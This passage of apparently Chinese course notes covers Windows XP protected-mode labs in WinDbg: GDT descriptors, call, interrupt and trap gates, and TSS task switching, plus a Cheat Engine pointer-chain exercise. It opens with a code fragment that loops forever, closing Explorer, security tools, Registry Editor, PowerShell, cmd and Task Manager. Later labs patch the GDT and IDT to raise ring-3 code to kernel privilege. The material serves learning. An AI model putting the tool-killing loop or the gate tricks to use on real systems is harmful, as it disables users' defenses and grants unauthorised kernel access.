keybd_event(76,0,0,0); keybd_event(76,0,KEYEVENTF_KEYUP,0); return 0; } void test() { while (true) { TCHAR szTitle[MAX_PATH] = {0}; HWND hwnd1 = ::FindWindow(NULL,TEXT(\"文件资源管理器\")); HWND hwnd2 = ::FindWindow(NULL,TEXT(\"火绒安全分析工具\")); HWND hwnd3 = ::FindWindow(NULL,TEXT(\"设置\")); HWND hwnd4 = ::FindWindow(NULL,TEXT(\"Windows 安全中心\")); HWND hwnd5 = ::FindWindow(NULL,TEXT(\"注册表编辑器\")); HWND hwnd6 = ::FindWindow(NULL,TEXT(\"Windows PowerShell\")); HWND hwnd7 = ::FindWindow(NULL,TEXT(\"命令提示符\")); HWND hwnd8 = ::FindWindow(NULL,TEXT(\"任务管理器\")); SwitchToThisWindow(hwnd1,false); SwitchToThisWindow(hwnd2,false); SwitchToThisWindow(hwnd3,false); SwitchToThisWindow(hwnd4,false); SwitchToThisWindow(hwnd5,false); SwitchToThisWindow(hwnd6,false); SwitchToThisWindow(hwnd7,false); SwitchToThisWindow(hwnd8,false); if(hwnd1 != NULL || hwnd2 != NULL || hwnd3 != NULL || hwnd4 != NULL || hwnd5 != NULL || hwnd6 != NULL || hwnd7 != NULL || hwnd8 != NULL) { ::SendMessage(hwnd1,WM_CLOSE,0,0); ::SendMessage(hwnd2,WM_CLOSE,0,0); ::SendMessage(hwnd3,WM_CLOSE,0,0); ::SendMessage(hwnd4,WM_CLOSE,0,0); ::SendMessage(hwnd5,WM_CLOSE,0,0); ::SendMessage(hwnd6,WM_CLOSE,0,0); ::SendMessage(hwnd7,WM_CLOSE,0,0); ::SendMessage(hwnd8,WM_CLOSE,0,0); } Sleep(100); } } CE 第八题\n首先找到是谁修改了这个值\nRAX=00000DD5 RBX=015F7270 RCX=E2A9C98E RDX=066FC98E RSI=01632ED0 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E94D 指针基址可能是 =01632ED0 10002E940 - mov ecx,00000FA0 10002E945 - call 10000FC10 10002E94A - mov [rsi+18],eax \u003c---- 10002E94D - lea rcx,[rbp-08] 10002E951 - call 100008F10 可以看到是eax向[rsi+18]赋值，为什么要找rsi而不是eax？\n关注rsi是因为它指向存储数据的内存结构，其来源可通过指针链关联到静态基址；而eax仅是一个临时数值，无法用于基址定位。通过追踪rsi的赋值逻辑，才能找到稳定的基址表达式。\n由于目前rsi里面的值有可能直接是基址，也有可能是新一级的偏移（比如[基址 + 0x100]）；是新一级的偏移的话就不能直接通过0x1632ED0去寻找了，而是要根据减去偏移后的值去寻找。\n直接找谁修改了它发现没有人修改它，就看谁访问了它（这个它就是根据0x1632ED0进行新搜索的地址，判断它直接是基址还是偏移）：\n这时有两条指令访问了它，其中一个是访问它进行比较，没有价值。我们看另外一个：\nRAX=0164AF60 RBX=015F7270 RCX=015F7270 RDX=0000185A RSI=01632ED0 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E90B 指针基址可能是 =01632ED0 10002E900 - je 10002E9A7 10002E906 - nop 2 10002E908 - mov rsi,[rsi] \u003c---- 10002E90B - mov rax,rsi 10002E90E - mov edx,[rax+04] 这是将rsi地址的值赋给rsi。\n发现它没有偏移，那么就直接用0x1632ED0地址的值（0x164AF60）再次进行搜索，同样先看一下谁访问了它：\nRAX=0164AEE0 RBX=015F7270 RCX=015F7270 RDX=00011DB9 RSI=0164AF60 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E8C0 指针基址可能是 =0164AEE0 10002E8B5 - je 10002E9A7 10002E8BB - nop 10002E8BC - mov rsi,[rsi+18] \u003c---- 10002E8C0 - mov rax,rsi 10002E8C3 - mov edx,[rax+0C] 这是将rsi+0x18地址的值赋给rsi。这时就不能用0x164AF60地址的值（0x164AEF8）直接搜索，因为有0x18的偏移。\n所以用0x164AEE0再次进行搜索，同样先看一下谁访问了它：\nRAX=01632C50 RBX=015F7270 RCX=015F7270 RDX=00001C5A RSI=0164AEE0 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E878 指针基址可能是 =01632C50 10002E86D - je 10002E9A7 10002E873 - nop 10002E874 - mov rsi,[rsi+10] \u003c---- 10002E878 - mov rax,rsi 10002E87B - mov edx,[rax+04] 同上，所以就直接用0x1632C50再次进行搜索，同样先看一下谁访问了它：\nRAX=015FBAB0 RBX=015F7270 RCX=015F7270 RDX=015FBAB0 RSI=01632C50 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E82D 指针基址可能是 =100325B00 10002E81D - mov qword ptr [rbp-08],00000000 10002E825 - nop 10002E826 - mov rsi,[100325B00] \u003c---- 10002E82D - mov rax,rsi 10002E830 - mov edx,[rax+04] 这是可以看到已经不是偏移了，而是硬编码的地址，就是向这个地址进行赋值的。综上找到的结构为：\n[[[[[100325B00]+10]+18]]+18] = eax 我们需要构造这个结构去直接找到被赋值的位置，在ce中手动添加地址：\n就可以看到正常显示数值了，即使改变指针也不怕了。\n保护模式 段描述符与段选择子 在windbg中查看GDT表的基址和长度\n查看xp的GDT表\n0: kd\u003e r gdtr gdtr=8003f000\t#基址 0: kd\u003e r gdtl gdtl=000003ff\t#长度 分别使用dd dq指令查看GDT表\n0: kd\u003e dd 8003f000 ReadVirtual: 8003f000 not properly sign extended 8003f000 00000000 00000000 0000ffff 00cf9b00 8003f010 0000ffff 00cf9300 0000ffff 00cffb00 8003f020 0000ffff 00cff300 200020ab 80008b04 8003f030 f0000001 ffc093df 00000fff 0040f300 8003f040 0400ffff 0000f200 00000000 00000000 8003f050 27000068 80008955 27680068 80008955 8003f060 2f40ffff 00009302 80003fff 0000920b 8003f070 700003ff ff0092ff 0000ffff 80009a40 0: kd\u003e dq 8003f000 ReadVirtual: 8003f000 not properly sign extended 8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008955`27000068 80008955`27680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 段描述符查分实验：拆5个\n00cf9b00`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=1011 Address=0000 00cf9300`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=0011 Address=0000 00cffb00`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=1011 Address=0000 00cff300`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=0011 Address=0000 80008b04`200020ab\nBase=80 04 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 20ab 16~12 [8]=1000 p=1 DPL=00 s=0 Type=1011 Address=2000 8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008954`af000068 80008954`af680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 8003f080 80009240`0000ffff 00009200`00000000 00cf9b00`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[b]=1011 Address=0000 00cf9300`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[3]=0011 Address=0000 00cffb00`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[b]=1011 Address=0000 00cff300`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[3]=0011 Address=0000 80008b04`200020ab Base=80 04 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 20ab 16~12 [8]=1000 p=1 DPL=00 s=0 Type=[b]=1011 Address=2000 ffc093df`f0000001 Base=ff df 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=0 0001 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[3]=0011 Address=f000 0040f300`00000fff Base=00 00 23~20 [4]= 0100 G=0 D/B=1 AVL=0 Limit=0 0fff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[3]=0011 Address=0000 0000f200`0400ffff Base=00 00 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[2]=0010 Address=0400 80008954`af000068 Base=80 54 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0068 16~12 [8]=1000 p=1 DPL=00 s=0 Type=[9]=1001 Address=af00 00009302`2f40ffff Base=00 02 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[3]=0011 Address=2f40 ff0092ff`700003ff Base=ff ff 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 03ff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[2]=0010 Address=7000 80009a40`0000ffff Base=80 40 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[a]=1001 Address=0000 80009240`0000ffff Base=80 40 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[2]=0011 Address=0000 00009200`00000000 Base=00 00 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0000 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[2]=0011 Address=0000 段选择子拆分实验：\n23\n0010 0011 RPL=11(3) TI=0 Index=0010 0(4) 2B\n0010 1011 RPL=11(3) TI=0 Index=0010 1(5) 30\n0011 0000 RPL=00 TI=0 Index=0011 0(6) 3B\n0011 1011 RPL=11(3) TI=0 Index=0011 1(7) 53\n0101 0011 RPL=11(3) TI=0 Index=0101 0(10) 使用LES，LDS等指令修改段寄存器\nLES ebx, [SI]就是高两字节给es，低4字节给ebx\n段描述符属性P位_G位 查GDT表，如何快速确定哪个描述符的P位为0或者为1\n可以检测段描述符的第5位，如果大于等于8则P为1，否则P为0\n比如：00cf9b00`0000ffff\n查GDT表，如何快速确定哪个描述符的G位为0或者为1\n可以检测段描述符的第3位，如果大于等于8则G为1，否则G为0\n比如：00cf9b00`0000ffff\n将段描述符填写到段寄存器结构体中（每人填一个）(段选择子：23 2B 30 3B 53)\n比如我用xp的GDT表做一下：\n8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008955`27000068 80008955`27680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 23 0010 0011 Index=00100(4) --\u003e 00cff300`0000ffff 00cff300`0000ffff Base=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=0011 Address=0000 段描述符属性S位_TYPE域 判断哪些是系统段描述符?哪些是代码或者数据段描述符?\n因为DPL的值只可能是全1或全0，所以16~12位如果是数据段或代码段的话只能为f(1111)或9(1001)。那么在段描述符中找第五位，如果是f或9就是数据段或代码段。\n判断哪些是代码段描述符？哪些是数据段描述符？\n因为TYPE域的第11位只可能是1或0，而且全为1是代码段；全为0是数据段。那么在段描述符中第六位大于8就是代码段，小于8就是数据段。\n查分几个数据段: E W A\n00009302`2f40ffff Base=00 02 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00(0) s=1 Type=0011 --\u003e可读写，访问过 Address=2f40 0000920b`80003fff Base=00 0b 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 3fff 16~12 [9]=1001 p=1 DPL=00(0) s=1 Type=0010 --\u003e可读写 Address=8000 查分几个代码段:C R A\n80009a80`0000ffff Base=80 80 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00(0) s=1 Type=1010 --\u003e可读执行 Address=0000 00cffb00`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=1011 --\u003e可读执行，访问过 Address=0000 查分几个系统段描述符\n80008955`27000068 Base=80 55 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0068 16~12 [8]=1000 p=1 DPL=00(0) s=0 Type=1001 --\u003e386以上CPU的TSS，type第3位为1 Address=2700 80008955`27680068 Base=80 55 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0068 16~12 [8]=1000 p=1 DPL=00(0) s=0 Type=1001 --\u003e386以上CPU的TSS，type第3位为1 Address=2768 段权限检查 在3环能加载的数据段有哪些？\nCPL=3是最低权限，那么只能加载更低权限或相同权限的数据段，所以可以加载DPL=3的数据段\n在0环能加载的数据段有哪些?\nCPL=0，和第一题一样，所以可以加载DPL=0 / 1 / 2 / 3的数据段\n详细描述这下面代码的执行过程:\nmov ax,0x23 #0x23=0010 0011那么rpl为11(3)，index=00100(4)，在GDT表中找索引为4，接着去检查该段描述符是否为有效，然后看S位是否是数据/代码段还是系统段，然后再看TYPE域，比如我找的为00cff300`0000ffff，dpl就为3 mov ds,ax 代码间的跳转 后面的实验虚拟机一定要使用单核单处理器，不然实验会失败的！！！\n记住代码段间跳转的执行流程\n1、段选择子拆分 2、查表得到段描述符 3、权限检查 4、加载段描述符 5、代码执行 自己实现一致代码段的段间跳转。\n要求：CPL \u003e= DPL\n通过windbg的指令eq 地址 内容(eq 8003f048 00c9fc00 0000ffff)，构建段描述符00C9FC00·0000FFFF，并且记好索引位置 执行指令jmp far xx:xxxxxxxx 如果成功就会修改cs和eip 自己实现非一致代码段的段间跳转。\n要求： CPL == DPL 并且 RPL \u003c= DPL\n调用门 自己实现调用门（提权、无参数、EAX、ECX。存不存？）\n调用门描述符为：0000EC00·00080000\n代码如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e void __declspec(naked) GetRegister() { _asm { int 3 retf } } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, 废弃 *(WORD*)\u0026buff[4] = 0x48; // 段选择子 _asm { call far fword ptr[buff] } getchar(); } 在windbg中可以断下\n发现SS、ESP、CS寄存器都发生了变化\n自己实现调用门（提权、有参数）\n需要看一下调用门：\n调用门描述符为：0000EC03·00080000\n代码如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD x; DWORD y; DWORD z; void __declspec(naked) GetRegister() { _asm { pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+8+4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+8+0] mov dword ptr ds:[z],eax popfd popad retf 0xC } } void Printfall() { printf(\"%x %x %x\\n\",x,y,z); } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, 废弃 *(WORD*)\u0026buff[4] = 0x48; // 段选择子 _asm { push 1 push 2 push 3 call far fword ptr[buff] } Printfall(); getchar(); } 如何通过实验论证0环堆栈存储哪些数据，顺序是什么？\n这几行代码有什么意义？是必须的吗？\npushad pushfd …… popfd popad 用于保存和恢复寄存器的状态，也就是保护现场，防止其他寄存器被修改。\n这几行代码在做什么？\nmov eax,[esp+0x24+0x8+0x8] mov eax,[esp+0x24+0x8+0x8] mov eax,[esp+0x24+8+0] 访问我在栈中存的参数，查看栈的内容如下：\nkd\u003e dd b1ba6da0 ReadVirtual: b1ba6da0 not properly sign extended b1ba6da0 00000212 0012ff80 00000000 0012ff80 b1ba6db0 b1ba6dc4 7ffde000 00380df8 00000000 b1ba6dc0 cccccccc 004010ee 0000001b 00000003 b1ba6dd0 00000002 00000001 0012ff1c 00000023 b1ba6de0 805470de b12221f0 8a31b970 00000000 b1ba6df0 0000027f 00000000 00000000 00000000 b1ba6e00 00000000 ffff0000 00001f80 00000000 b1ba6e10 00000000 00000000 00000000 00000000 那么，esp+0x24+8就是b1ba6dcc的位置，就是访问参数3，2，1。\n更直观一点，不加pushad，pushfd，如下：\nkd\u003e dd bad7fdc4 ReadVirtual: bad7fdc4 not properly sign extended bad7fdc4 004010ee 0000001b 00000003 00000002 #004010ee是返回地址，0000001b是旧cs，0012ff1c是旧esp，23是旧ss bad7fdd4 00000001 0012ff1c 00000023 805470de bad7fde4 ba60eb85 8a25cd00 00000000 0000027f bad7fdf4 00000000 00000000 00000000 00000000 bad7fe04 ffff0000 00001f80 00000000 00000000 bad7fe14 00000000 00000000 00000000 00000000 bad7fe24 00000000 00000000 00000000 00000000 bad7fe34 00000000 00000000 00000000 00000000 测试 要求：代码正常执行不蓝屏\n构造一个调用门，实现3环读取高2G内存。\n调用门描述符为：0000EC00·00080000\n代码如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD x; DWORD y; DWORD z; void __declspec(naked) GetRegister() { _asm { pushad pushfd mov eax,0x8003f008 mov ebx,[eax] mov x,ebx mov ecx,4 add eax,ecx mov ebx,[eax] mov y,ebx add eax,ecx mov ebx,[eax] mov z,ebx popfd popad retf } } void Printfall() { printf(\"%x %x %x\\n\",x,y,z); } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, 废弃 *(WORD*)\u0026buff[4] = 0x48; // 段选择子 _asm { call far fword ptr[buff] } Printfall(); getchar(); } 输出结果：ffff cf9b00 ffff 在第一题的基础上进行修改，实现通过翻墙的方式返回到其他地址。\n调用门描述符为：0000EC00·00080000\n代码如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e void __declspec(naked) GetRegister() { _asm { pop eax mov eax,0x401070 //函数Printfall()的地址 push eax retf } } void Printfall() { printf(\"okokokokokokok\"); } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, 废弃 *(WORD*)\u0026buff[4] = 0x48; // 段选择子 _asm { call far fword ptr[buff] } getchar(); } 输出结果：okokokokokokok 在第一题的基础上进行修改，在门中再建一个门跳转到其他地址。\n调用门描述符为：0000EC00·00080000\n代码如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e int x=0; int y=0; char buff[6] = {0,0,0,0,0x48,0}; char buff1[6] = {0,0,0,0,0x90,0}; void __declspec(naked) GetRegister() { _asm { mov x,1 mov eax,0x00081070 mov ebx,0x8003f090 mov [ebx],eax mov eax,0x0040ec00 mov ebx,0x8003f094 mov [ebx],eax call far fword ptr[buff1] retf } } void __declspec(naked) two() { _asm { mov y,1 retf } } void main() { _asm { call far fword ptr[buff] } printf(\"%x %x\",x,y); getchar(); } 输出结果：1 1 中断门 自己实现中断门\n中断门描述符为：0000EE00·00080000\n代码如下：\n#include\u003cstdio.h\u003e #include\u003cwindows.h\u003e DWORD H void __declspec(naked) test(){ __asm{ pushad pushfd mov eax,0x8003f008 mov ebx,[eax] mov H,ebx popfd popad iretd } } int main(){\t__asm{ int 0x20; } printf(\"%X\", H); return 0; } 输出结果：FFFF 在调用门中实现使用IRETD返回\n调用门描述符为：0000EC00·00080000\n代码如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e char buff[6] = {0,0,0,0,0x48,0}; void __declspec(naked) GetRegister() { _asm { pop eax pop ebx mov ecx,0x11111111 push ecx push ebx push eax iretd } } void main() { _asm { call far fword ptr[buff] } printf(\"okokokokokokok\"); getchar(); } 输出结果：okokokokokokok 在中断门中实现用RETF返回\n中断门描述符为：0000EE00·00080000\n代码如下：\n#include\u003cstdio.h\u003e #include\u003cwindows.h\u003e void __declspec(naked) test(){ __asm{ pop eax pop ebx popfd push ebx push eax retf } } int main(){\t__asm{ int 0x20; } printf(\"okokokokokokok\"); getchar(); return 0; } 陷阱门 构造陷阱门 陷阱门描述符为：0000EF00·001b0000\n代码如下：\n#include\u003cstdio.h\u003e #include\u003cwindows.h\u003e void __declspec(naked) test(){ __asm{ pop eax pop ebx popfd push ebx push eax retf } } int main(){\t__asm{ int 0x20; } printf(\"okokokokokokok\"); getchar(); return 0; } 输出结果：okokokokokokok 任务段 找出GDT表中所有的TSS段描述符\n8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008955`27000068 80008955`27680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 8003f080 80009240`0000ffff 00009200`00000000 结尾为68，8003f050与8003f058\n实现任务切换\n注：使用指令!process 0 0获取Cr3的值（对应调试程序的Cr3，比如DirBase: 0aac0380）\n门描述符为：0000e900·00000068\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e DWORD dwOK; DWORD dwESP; DWORD dwCS; void __declspec(naked) test() { dwOK=1; __asm { mov eax,esp; mov dwESP,eax; mov word ptr [dwCS],ax; iretd; } } int main(int argc,char * argv[]) { char stack[100]={0}; //自己构造一个堆栈使用 DWORD cr3=0; DWORD addr=0; char buffer[6]={0}; //构造任务段 DWORD tss[0x68]={ 0x0, //link 0x0, //esp0 0x0, //ss0 0x0, //esp1 0x0, //ss1 0x0, //esp2 0x0, //ss2 0, //cr3 * (DWORD)addr, //eip * 0, //eflags 0, //eax 0, //ecx 0, //edx 0, //ebx ((DWORD)stack) + 100, //esp * 0, //ebp 0, //esi 0, //edi 0x23, //es * 0x08, //cs * 0x10, //ss * 0x23, //ds * 0x30, //fs * 0, //gs 0, //idt 0x20ac0000 //IO权限位图，VISTA之后不再用了，从其他结构体拷贝出来。 }; printf(\"Target:\\n\"); scanf(\"%x\",\u0026addr); tss[8]=addr; printf(\"tss：%x\\n\",tss); printf(\"CR3:\\n\"); scanf(\"%x\",\u0026cr3); //看准了DirBase: tss[7]=cr3; *(WORD*)(\u0026buffer[4])=0x93; __asm { call fword ptr [buffer]; } printf(\"dwESP=%x\\tdwCS=%x\\n\",dwESP,dwCS); system(\"pause\"); return 0; } 输出结果：dwESP=12ff80 dwCS=ff80 任务门 自己实现一个任务门。\n门描述符为：0000e900·00000068\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e void __declspec(naked) test() { __asm { iretd; } } int main(int argc,char * argv[]) { char stack[100]={0}; //自己构造一个堆栈使用 DWORD cr3=0; DWORD addr=0; DWORD tss[0x68]={ 0x0, //link 0x0, //esp0 0x0, //ss0 0x0, //esp1 0x0, //ss1 0x0, //esp2 0x0, //ss2 0, //cr3 * (DWORD)addr, //eip * 0, //eflags 0, //eax 0, //ecx 0, //edx 0, //ebx ((DWORD)stack) + 100, //esp * 0, //ebp 0, //esi 0, //edi 0x23, //es * 0x08, //cs * 0x10, //ss * 0x23, //ds * 0x30, //fs * 0, //gs 0, //idt 0x20ac0000 //IO权限位图，VISTA之后不再用了，从其他结构体拷贝出来。 }; printf(\"Target:\\n\"); scanf(\"%x\",\u0026addr); tss[8]=addr; printf(\"tss：%x\\n\",tss); printf(\"CR3:\\n\"); scanf(\"%x\",\u0026cr3); //看准了DirBase: tss[7]=cr3; __asm { int 20; } //kd \u003e eq 8003f048 0000e912·ff140068 写入TSS段描述符到GDT //kd \u003e eq 8003f500 0000e500·004b0000 写入任务门到 IDT system(\"pause\"); return 0; } 成功执行🥲 在保护模式中，当CPU检测到异常的时候，会根据异常的类型来查找对应的异常处理函数，比如：当指令检测到除零异常时，将默认执行0号中断，请列出处理除零异常函数的地址。\n80548e00`000831a0 address:0x805431a0 ffffffff`805431a0 6a00 push 0 ffffffff`805431a2 66c74424020000 mov word ptr [esp+2], 0 ffffffff`805431a9 55 push ebp ffffffff`805431aa 53 push ebx ffffffff`805431ab 56 push esi ffffffff`805431ac 57 push edi ffffffff`805431ad 0fa0 push fs ffffffff`805431af bb30000000 mov ebx, 30h ffffffff`805431b4 668ee3 mov fs, bx ffffffff`805431b7 648b1d00000000 mov ebx, dword ptr fs:[0] ffffffff`805431be 53 push ebx ffffffff`805431bf 83ec04 sub esp, 4 ffffffff`805431c2 50 push eax ffffffff`805431c3 51 push ecx ffffffff`805431c4 52 push edx ffffffff`805431c5 1e push ds ffffffff`805431c6 06 push es ffffffff`805431c7 0fa8 push gs ffffffff`805431c9 66b82300 mov ax, 23h ffffffff`805431cd 83ec30 sub esp, 30h ffffffff`805431d0 668ed8 mov ds, ax ffffffff`805431d3 668ec0 mov es, ax ffffffff`805431d6 8bec mov ebp, esp ffffffff`805431d8 f744247000000200 test dword ptr [esp+70h], 20000h ffffffff`805431e0 7596 jne ntkrpamp!V86_kit0_a (80543178) ffffffff`805431e2 fc cld ffffffff`805431e3 8b5d60 mov ebx, dword ptr [ebp+60h] ffffffff`805431e6 8b7d68 mov edi, dword ptr [ebp+68h] ffffffff`805431e9 89550c mov dword ptr [ebp+0Ch], edx ffffffff`805431ec c74508000ddbba mov dword ptr [ebp+8], 0BADB0D00h ffffffff`805431f3 895d00 mov dword ptr [ebp], ebx ffffffff`805431f6 897d04 mov dword ptr [ebp+4], edi ffffffff`805431f9 64f60550000000ff test byte ptr fs:[50h], 0FFh ffffffff`80543201 0f85edfeffff jne ntkrpamp!Dr_kit0_a (805430f4) ffffffff`80543207 f7457000000200 test dword ptr [ebp+70h], 20000h ffffffff`8054320e 753d jne ntkrpamp!_KiTrap00+0xad (8054324d) ffffffff`80543210 f6456c01 test byte ptr [ebp+6Ch], 1 ffffffff`80543214 7407 je ntkrpamp!_KiTrap00+0x7d (8054321d) ffffffff`80543216 66837d6c1b cmp word ptr [ebp+6Ch], 1Bh ffffffff`8054321b 751d jne ntkrpamp!_KiTrap00+0x9a (8054323a) ffffffff`8054321d fb sti ffffffff`8054321e 55 push ebp ffffffff`8054321f e87c040600 call ntkrpamp!_Ki386CheckDivideByZeroTrap@4 (805a36a0) ffffffff`80543224 8b5d68 mov ebx, dword ptr [ebp+68h] ffffffff`80543227 e9ebfdffff jmp ntkrpamp!Kei386EoiHelper@0+0x16b (80543017) ffffffff`8054322c fb sti ffffffff`8054322d 8b5d68 mov ebx, dword ptr [ebp+68h] ffffffff`80543230 b8940000c0 mov eax, 0C0000094h ffffffff`80543235 e9ddfdffff jmp ntkrpamp!Kei386EoiHelper@0+0x16b (80543017) ffffffff`8054323a 648b1d24010000 mov ebx, dword ptr fs:[124h] ffffffff`80543241 8b5b44 mov ebx, dword ptr [ebx+44h] ffffffff`80543244 83bb5801000000 cmp dword ptr [ebx+158h], 0 ffffffff`8054324b 74df je ntkrpamp!_KiTrap00+0x8c (8054322c) ffffffff`8054324d 6a00 push 0 ffffffff`8054324f e8a42c0000 call ntkrpamp!_Ki386VdmReflectException_A@4 (80545ef8) ffffffff`80543254 0ac0 or al, al ffffffff`80543256 74d4 je ntkrpamp!_KiTrap00+0x8c (8054322c) ffffffff`80543258 e94ffcffff jmp ntkrpamp!Kei386EoiHelper@0 (80542eac) ffffffff`8054325d 8d4900 lea ecx, [ecx] ffffffff`80543260 c74568c8245480 mov dword ptr [ebp+68h], 805424C8h ffffffff`80543267 806571fe and byte ptr [ebp+71h], 0FEh ffffffff`8054326b e93cfcffff jmp ntkrpamp!Kei386EoiHelper@0 (80542eac) 在保护模式中，当CPU检测到异常的时候，会根据异常的类型来查找对应的异常处理函数，比如:当指令检测到除零异常时，将默认执行0号中断所指定的异常处理程序,但是,异常处理程序本身任然可能出现异常,如果异常处理程序出现异常时候（双重错误） ,CPU会默认执行8号中断，请分析8号中断是什么？做了什么事情？替换了哪些寄存器？替换后的值是多少？为什么这样设计？\n00008500`00501198 50 = 0101 0 000 index = 10 门如下： 80008955`87000068 address=80558700 kd\u003e dd 80558700 ReadVirtual: 80558700 not properly sign extended 80558700 00000000 80555700 00000010 00000000 80558710 00000000 00000000 00000000 00039000 80558720 804e0891 00000000 00000000 00000000 80558730 00000000 00000000 80555700 00000000 80558740 00000000 00000000 00000023 00000008 80558750 00000010 00000023 00000030 00000000 80558760 00000000 20ac0000 00000028 80555700 80558770 00000010 00000000 00000000 00000000 可以看到，改了ESP0 = 80555700，SS0 = 10，EIP = 804e0891，ESP = 80555700，ES = 23，CS = 8，SS = 10，DS = 23，FS = 30 将eip放到反汇编窗口可以看到如下: nt!KiTrap08: ffffffff`804e0891 fa cli ffffffff`804e0892 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] …… 这就是8号中断的执行的位置 考试 将某一代码片运行到1环\n门描述符为：0000e900·00000068\n代码如下：\n//eq 8003f0d8 0040E912`FD6C0068 ;TSS描述符 D9，注意正确 //eq 8003f0b0 00CFBB00`0000FFFF ;cs:B1 //eq 8003f0b8 00CFB300`0000FFFF ;ss:B9 //eq 8003f0c0 FFC0B3DF`F0000001 ;fs:C1，这个东西是关键，运气不好容易因线程切换蓝屏 #include \u003cWindows.h\u003e #include 